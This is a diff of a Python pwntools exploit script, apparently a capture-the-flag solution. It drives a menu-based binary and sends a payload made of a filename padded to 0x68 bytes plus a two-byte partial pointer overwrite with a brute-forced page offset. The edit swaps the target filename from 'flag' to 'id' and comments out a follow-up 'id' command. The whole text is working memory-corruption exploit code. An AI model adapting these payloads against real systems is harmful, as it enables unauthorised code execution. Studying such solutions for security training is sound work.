@@ -81,13 +81,14 @@ add(0x1, p8(3))
 sh.sendlineafter('>>', '3')
 sh.sendlineafter('>>', '0') # O_RDONLY
 
-payload = 'flag\0'.ljust(0x68, '\0') + p16(0x14c + random.randint(0, 0xf) * 0x1000)
+#payload = 'flag\0'.ljust(0x68, '\0') + p16(0x14c + random.randint(0, 0xf) * 0x1000)
+payload = 'id\0'.ljust(0x68, '\0') + p16(0x14c + random.randint(0, 0xf) * 0x1000)
 # payload = 'flag\0'.ljust(0x68, '\0') + '\x4c\x51'
 sh.sendlineafter('>', str(len(payload)))
 sh.sendafter('>>', payload)
 
-sleep(1)
-sh.sendline("id")
+#sleep(1)
+#sh.sendline("id")
 sleep(1)
 print sh.recv(timeout=5)
 sleep(10)
